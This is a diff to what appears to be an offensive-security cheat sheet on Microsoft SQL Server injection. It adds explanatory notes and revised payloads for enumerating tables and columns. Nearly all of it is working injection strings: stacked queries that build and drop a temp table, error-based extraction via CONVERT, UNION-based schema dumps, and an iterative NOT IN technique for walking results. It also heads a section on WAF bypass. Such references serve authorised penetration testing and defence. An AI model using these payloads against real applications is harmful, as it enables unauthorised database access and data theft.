@@ -153,11 +153,17 @@ SELECT STUFF((
 
 For older versions or when XML functions are unavailable, you can use a temporary table to iterate through data:
 
+**How the iteration works:**
+
+- `@xy=':'` - Initializes with colon because `:` sorts before all letters in ASCII, ensuring the first table name will be greater than `@xy`
+- `name>@xy` - On each iteration, only selects names alphabetically after the current `@xy` value; as `@xy` accumulates names, this condition advances through the result set
+- `SUBSTRING(xy,1,353)` - Limits output to 353 characters because error messages in MSSQL are typically truncated around this length; for longer results, use `SUBSTRING(xy,354,353)` to get the next chunk
+
 ```sql
 -- 1. Create temp table and insert data
 AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;
 
--- 2. Dump content
+-- 2. Dump content (first 353 chars; use SUBSTRING(xy,354,353) for next chunk)
 AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
 
 -- 3. Cleanup
@@ -180,7 +186,6 @@ AND 1=0; DROP TABLE TMP_DB;
 -- Get columns for a specific table
 ' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--
 
-
 -- Get table and column names
 ' UNION SELECT NULL, table_name + '.' + column_name, NULL FROM information_schema.columns--
 ```
@@ -190,14 +195,23 @@ AND 1=0; DROP TABLE TMP_DB;
 ```sql
 -- Using error-based extraction for table names
 ' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--
+```
 
--- Iterate through tables using NOT IN
+**Iterative NOT IN extraction:** Run the first query to get result A, then add A to the `NOT IN()` list to get result B, then `NOT IN('A','B')` to get C, and so on until no new results are returned.
+
+```sql
+-- First iteration: get first table (e.g., returns 'users')
 ' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--
-' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))--
+
+-- Second iteration: exclude 'users' to get next table (e.g., 'orders')
+' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN('users'))--
+
+-- Third iteration: exclude both to get next (e.g., 'products')
+' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN('users','orders'))--
 
 -- Same pattern for columns
 ' AND 1=(SELECT TOP 1 column_name FROM information_schema.columns)--
-' AND 1=(SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))--
+' AND 1=(SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN('id'))--
 ```
 
 #### Hex Encoding for WAF Bypass
